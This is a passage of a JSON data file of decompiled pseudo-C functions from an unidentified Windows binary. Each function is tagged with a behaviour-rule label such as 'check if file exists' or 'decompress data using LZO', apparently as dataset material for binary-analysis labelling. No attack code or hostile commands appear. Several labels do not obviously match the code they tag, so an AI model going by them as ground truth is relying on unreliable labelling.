        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.0042c720(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint var_8h_2;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    int32_t *var_1ch_2;\n    uchar *var_18h;\n    int32_t var_14h;\n    uchar *var_10h;\n    int32_t var_ch_2;\n    uint var_8h_3;\n    \n    iVar8 = 0;\n    iVar5 = (param_1 + 1) * -4;\n    var_10h = &stack0xffffffd4 + iVar5;\n    puVar2 = &stack0xffffffd4 + iVar5;\n    var_1ch_2 = in_EAX;\n    var_ch_2 = param_1;\n    do {\n        puVar6 = puVar2;\n        *(puVar6 + -4) = 0x42c74f;\n        iVar3 = fcn.0040a858();\n        *(puVar6 + -4) = 0;\n        *(puVar6 + -8) = 0;\n        *(puVar6 + -0xc) = iVar3;\n        *(puVar6 + -0x10) = param_2;\n        *(puVar6 + -0x14) = 0;\n        *(puVar6 + -0x18) = 0;\n        *(puVar6 + -0x1c) = 0x42c760;\n        var_14h = sub.kernel32.dll_MultiByteToWideChar_1();\n        var_14h = var_14h + 1;\n        iVar5 = -(var_14h * 2 + 3U & 0xfffffffc);\n        var_18h = puVar6 + iVar5 + -0x18;\n        if (iVar8 == 0) {\n            *var_10h = puVar6 + iVar5 + -0x18;\n        }\n        else {\n            *(var_10h + (var_ch_2 - iVar8) * 4) = puVar6 + iVar5 + -0x18;\n            var_18h = puVar6 + iVar5 + -0x18;\n        }\n        *(puVar6 + iVar5 + -0x1c) = var_14h;\n        *(puVar6 + iVar5 + -0x20) = var_18h;\n        *(puVar6 + iVar5 + -0x24) = iVar3;\n        *(puVar6 + iVar5 + -0x28) = param_2;\n        *(puVar6 + iVar5 + -0x2c) = 0;\n        *(puVar6 + iVar5 + -0x30) = 0;\n        *(puVar6 + iVar5 + -0x34) = 0x42c7a5;\n        sub.kernel32.dll_MultiByteToWideChar_1();\n        *(var_18h + var_14h * 2 + -2) = 0;\n        param_2 = param_2 + iVar3 + 1;\n        iVar8 = iVar8 + 1;\n        puVar2 = puVar6 + iVar5 + -0x30;\n    } while (iVar8 != var_ch_2);\n    *(puVar6 + iVar5 + -0x34) = var_8h_2;\n    *(puVar6 + iVar5 + -0x38) = 0x42c7c4;\n    uVar4 = sub.kernel32.dll_GetThreadLocale_1();\n    *(puVar6 + iVar5 + -0x38) = uVar4;\n    *(puVar6 + iVar5 + -0x3c) = var_ch_2;\n    *(puVar6 + iVar5 + -0x40) = var_10h;\n    *(puVar6 + iVar5 + -0x44) = *0x4924c0;\n    *(puVar6 + iVar5 + -0x48) = var_1ch_2;\n    pcVar1 = *(*var_1ch_2 + 0x14);\n    puVar7 = puVar6 + iVar5 + -0x4c;\n    *(puVar6 + iVar5 + -0x4c) = 0x42c7dc;\n    iVar5 = (*pcVar1)();\n    if (iVar5 == -0x7ffdfffa) {\n        *(puVar7 + -4) = &stack0xfffffffc;\n        *(puVar7 + -8) = 0x42c7e9;\n        fcn.0042c6ec(*(puVar7 + -4));\n    }\n    else {\n        *(puVar7 + -4) = 0x42c7f1;\n        fcn.0042bd00();\n    }\n    return;\n}\n",
        "token_count": 1152
    },
    "00436ec8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00436ec8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t unaff_EBX;\n    \n    iVar1 = fcn.0040e8bc();\n    if (iVar1 != 0) {\n        fcn.00405a84();\n    }\n    return unaff_EBX & 0xffffff00 | iVar1 != 0;\n}\n",
        "token_count": 90
    },
    "0043c9e4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043c9e4(uint param_1, int32_t param_2)\n\n{\n    fcn.00454778();\n    *(param_2 + 0x24) = *(param_2 + 0x24) & 0xfffffffc;\n    return;\n}\n",
        "token_count": 66
    },
    "00452c90": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452c90(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_20h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00418410();\n    fcn.00450294();\n    iVar1 = *(*(arg_8h + -8) + 8);\n    fcn.00418460(&var_20h, \n                 ((*(iVar1 + 0x58) - *(iVar1 + 0x50)) + *(*(*(arg_8h + -4) + 0x30) + 0x4c)) - *(*(arg_8h + -4) + 0x4c));\n    fcn.00450144();\n    return;\n}\n",
        "token_count": 179
    },
    "00472fd4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00472fd4(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint8_t *puVar3;\n    int16_t in_CX;\n    int16_t in_DX;\n    int32_t iVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX + -0x101 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_DX - 0x101U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_DX - 0x101U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xc) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX + -1 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 5;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | in_CX - 1U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = in_CX - 1U >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xb;\n    }\n    if (*(in_EAX + 0x16b8) < 0xd) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h + -4 << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 4;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h - 4U << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4);\n        iVar4 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = (arg_8h - 4U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xc;\n    }\n    iVar4 = 0;\n    puVar3 = 0x491f10;\n    if (0 < arg_8h) {\n        do {\n            if (*(in_EAX + 0x16b8) < 0xe) {\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xa7a + *puVar3 * 4) << (*(in_EAX + 0x16b8) & 0x1f)\n                ;\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n            }\n            else {\n                uVar1 = *(in_EAX + 0xa7a + *puVar3 * 4);\n                *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                iVar2 = *(in_EAX + 0x14);\n                *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n            }\n            iVar4 = iVar4 + 1;\n            puVar3 = puVar3 + 1;\n        } while (iVar4 < arg_8h);\n    }\n    fcn.004728e8();\n    fcn.004728e8();\n    return;\n}\n",
        "token_count": 1748
    },
    "00474ec8": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00474ec8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x474ee1;\n    fcn.004059cc();\n    puStack28 = 0x474ee9;\n    fcn.004059cc();\n    puStack28 = 0x474ef1;\n    fcn.004059cc();\n    uStack32 = 0x474f7a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 0x14);\n    fcn.00405584();\n    fcn.00405530();\n    fcn.00405584();\n    fcn.00405584();\n    fcn.00405584();\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.00483da0, uVar1, 0, arg_8h + -4);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x474f81);\n    return;\n}\n",
        "token_count": 321
    },
    "00404124": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00404124(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "0041f504": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f504(uint param_1, int32_t param_2)\n\n{\n    if ((-0x81 < param_2) && (param_2 < 0x80)) {\n        fcn.0041f688();\n        fcn.0041f48c();\n        return;\n    }\n    if ((param_2 < -0x8000) || (0x7fff < param_2)) {\n        fcn.0041f688();\n        fcn.0041f48c();\n    }\n    else {\n        fcn.0041f688();\n        fcn.0041f48c();\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "004400c8": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t fcn.004400c8(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    iVar1 = sub.user32.dll_GetParent();\n    while ((iVar1 != 0 && (uVar2 = sub.user32.dll_GetWindowLongA(iVar1, 0xffffffec),  (uVar2 & 0x80) == 0x80))) {\n        iVar1 = sub.user32.dll_GetParent();\n    }\n    if (iVar1 == 0) {\n        if (*(*0x497c1c + 0x44) != 0) {\n            uVar3 = fcn.00458568(0xffffffec);\n            uVar2 = sub.user32.dll_GetWindowLongA(uVar3);\n            if ((uVar2 & 0x80) == 0) {\n                iVar1 = fcn.00458568();\n                return iVar1;\n            }\n        }\n        iVar1 = *(*0x497c1c + 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 235
    },
    "004050e8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004050e8(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t **in_FS_OFFSET;\n    \n    if (*0x4957cc != NULL) {\n        ppiVar1 = *in_FS_OFFSET;\n        if (*0x4957cc == ppiVar1) {\n            *in_FS_OFFSET = **0x4957cc;\n            return;\n        }\n        for (; ppiVar1 != 0xffffffff; ppiVar1 = *ppiVar1) {\n            if (*ppiVar1 == *0x4957cc) {\n                *ppiVar1 = **0x4957cc;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "00407644": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00407644(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040763c();\n    if (iVar1 != 0) {\n        if (*0x48f7b8 == -1) {\n            fcn.00405470();\n        }\n        iVar1 = fcn.00407630();\n        if (iVar1 == 0) {\n            fcn.00405470();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x48f7b8, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0040a20c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040a20c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    lpDistanceToMoveHigh = arg_ch;\n    iVar1 = sub.kernel32.dll_SetFilePointer_1();\n    if (iVar1 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 != 0) {\n            lpDistanceToMoveHigh = 0xffffffff;\n        }\n    }\n    return CONCAT44(lpDistanceToMoveHigh, iVar1);\n}\n",
        "token_count": 139
    },
    "0040a25c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a25c(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0040a280": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040a280(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = fcn.004059dc();\n    uVar2 = sub.kernel32.dll_GetFileAttributesA(uVar1);\n    if ((uVar2 != 0xffffffff) && ((uVar2 & 0x10) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 96
    },
    "0040a478": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a478(int32_t param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    *(param_1 + 0x18) = ~param_2 & 0x16;\n    uVar1 = fcn.004059dc(param_1 + 0x20);\n    iVar2 = sub.kernel32.dll_FindFirstFileA_1(uVar1);\n    *(param_1 + 0x1c) = iVar2;\n    if (iVar2 == -1) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n    }\n    else {\n        iVar2 = fcn.0040a3f4();\n        if (iVar2 != 0) {\n            fcn.0040a4ec();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 190
    },
    "0040a4ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0040a4ec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) != -1) {\n        sub.kernel32.dll_FindClose_1(*(in_EAX + 0x1c));\n        *(in_EAX + 0x1c) = 0xffffffff;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "0040d538": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d538(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x40d59d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    for (iVar2 = 1; *(iVar2 * 4 + 0x4958f0) != -1; iVar2 = iVar2 + 1) {\n        if (iVar2 == 7) goto code_r0x0040d587;\n    }\n    fcn.00405728();\n    uVar1 = fcn.00409f08();\n    *(iVar2 * 4 + 0x4958f0) = uVar1;\ncode_r0x0040d587:\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x40d5a4;\n    uStack24 = 0x40d59c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 271
    },
    "00418488": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00418488(void)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*in_EAX == -1) && (in_EAX[1] == -1)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 57
    },
    "0041c68c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c68c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004198e4();\n    if (iVar1 != -1) {\n        fcn.0041977c();\n    }\n    iVar1 = fcn.004198e4();\n    if (iVar1 < 0) {\n        fcn.00419730();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "0041ca20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041ca20(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004166d4();\n    if (iVar1 == -1) {\n        fcn.0041c9e8();\n    }\n    return iVar1;\n}\n",
        "token_count": 63
    },
    "004368ac": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004368ac(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00436878();\n    if (iVar1 == -1) {\n        fcn.00433a04();\n    }\n    fcn.00436754();\n    return;\n}\n",
        "token_count": 63
    },
    "00438368": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00438368(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t in_EDX;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if ((in_EDX & 0x10) == 0) {\n        iVar1 = sub.user32.dll_GetMenuItemID();\n        if (iVar1 != -1) {\n            iVar3 = fcn.00437994();\n        }\n    }\n    else {\n        sub.user32.dll_GetSubMenu();\n        iVar3 = fcn.00437994();\n    }\n    if (iVar3 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = fcn.0043bc4c();\n    }\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "00443e84": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00443e84(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    uVar1 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    *(in_EAX + 0x60) = uVar1;\n    iVar2 = -0x16;\n    do {\n        sub.user32.dll_LoadCursorA();\n        fcn.00443f40();\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != -1);\n    return;\n}\n",
        "token_count": 126
    },
    "004441f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004441f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != -1) {\n        for (puVar2 = *(in_EAX + 0x5c); (puVar2 != NULL && (param_2 != puVar2[1])); puVar2 = *puVar2) {\n        }\n        if (puVar2 == NULL) {\n            uVar1 = *(in_EAX + 0x60);\n        }\n        else {\n            uVar1 = puVar2[2];\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "00448c4c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00448c4c(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack104;\n    uint uStack100;\n    uint uStack96;\n    uchar *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint himl;\n    uint var_4h;\n    \n    puStack68 = 0x448c77;\n    himl = param_2;\n    fcn.00418438(&fcn.00448c4c::var_28h, *(in_EAX + 0x30));\n    puStack68 = 0x448c7f;\n    fcn.004498e8();\n    uStack72 = 0x448de5;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x448c99;\n    puStack68 = &stack0xfffffffc;\n    var_ch = fcn.0042935c();\n    uStack84 = 0x448dc8;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack92 = 0x448cb8;\n    puStack80 = &stack0xfffffffc;\n    (**(*var_ch + 0x34))();\n    puStack92 = 0x448cc6;\n    (**(*var_ch + 0x40))();\n    puStack92 = 0x448cd2;\n    var_10h = fcn.0042935c();\n    uStack96 = 0x448dab;\n    uStack100 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff9c;\n    puStack92 = &stack0xfffffffc;\n    fcn.0042a760();\n    (**(*var_10h + 0x34))();\n    (**(*var_10h + 0x40))();\n    uStack104 = himl;\n    iVar1 = sub.comctl32.dll_ImageList_GetImageCount();\n    if (-1 < iVar1 + -1) {\n        iVar3 = 0;\n        do {\n            if ((param_1 == -1) || (iVar3 == param_1)) {\n                var_14h = fcn.00429930();\n                fcn.004252dc();\n                uVar2 = fcn.00425694(0, 0, 0);\n                sub.comctl32.dll_ImageList_Draw(himl, iVar3, uVar2);\n                var_18h = fcn.00429930();\n                fcn.004252dc();\n                fcn.00425694(0, 0, 0x10);\n                uStack104 = himl;\n                sub.comctl32.dll_ImageList_Draw();\n                fcn.0044881c();\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack104;\n    uStack96 = 0x448db2;\n    uStack100 = 0x448daa;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 793
    },
    "00450094": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00450094(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00450c5c();\n    }\n    if (param_2 == in_EAX[0xc]) {\n        fcn.00450144();\n    }\n    else {\n        fcn.00451b64();\n    }\n    if ((param_2 == 0) || (param_2 == -1)) {\n        (**(*in_EAX + 0x6c))();\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00469bb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00469bb0(void)\n\n{\n    uint in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 0x16;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x46a18b;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00469bb0::var_20h;\n    var_14h = in_EAX;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.00421644();\n    var_18h = fcn.00404620();\n    piVar1 = fcn.00404620();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421e20();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            iVar2 = var_38h;\n            (**(*var_18h + 0xc))(var_4h);\n            (**(*var_18h + 0xc))(0x46a1dc, var_34h);\n            fcn.00421fe8();\n            fcn.0040a67c();\n            var_34h = 0x46a1dc;\n            var_38h = 0x469c93;\n            (**(*var_18h + 0xc))();\n            var_8h = 0x469ca0;\n            fcn.00421fe8();\n            var_8h = var_44h;\n            var_ch = 0x46a1dc;\n            var_10h = 0x46a1e8;\n            var_14h = 0x46a1a4;\n            var_18h = 0x46a1dc;\n            var_1ch = 0x46a1f8;\n            var_20h = 0x46a204;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (iVar2 != 1);\n    }\n    fcn.004216f0();\n    (**(*var_18h + 0x44))();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421e20();\n    iVar2 = (**(*var_18h + 0x14))();\n    if (-1 < iVar2 + -1) {\n        var_1ch = 0;\n        do {\n            (**(*var_18h + 0xc))(var_8h);\n            (**(*var_18h + 0xc))(0x46a1dc, var_4ch);\n            fcn.00421fe8();\n            fcn.0040a67c();\n            (**(*var_18h + 0xc))(0x46a1dc);\n            var_8h = 0x469d8b;\n            fcn.00421fe8();\n            var_8h = var_5ch;\n            var_ch = 0x46a1dc;\n            var_10h = 0x46a210;\n            var_14h = 0x46a1a4;\n            var_18h = 0x46a1dc;\n            var_1ch = 0x46a1f8;\n            var_20h = 0x46a204;\n            fcn.004058e0();\n            var_1ch = var_1ch + 1;\n        } while (var_50h != 1);\n    }\n    fcn.004216f0();\n    (**(*var_18h + 0x44))();\n    fcn.00421720();\n    fcn.00421864();\n    fcn.00421d58();\n    var_30h = (**(*var_18h + 0x14))();\n    if (-1 < var_30h + -1) {\n        var_1ch = 0;\n        do {\n            fcn.004216f0();\n            (**(*var_18h + 0xc))();\n            fcn.00405864();\n            fcn.00421864();\n            fcn.00421e20();\n            var_20h = (**(*piVar1 + 0x54))();\n            (**(*piVar1 + 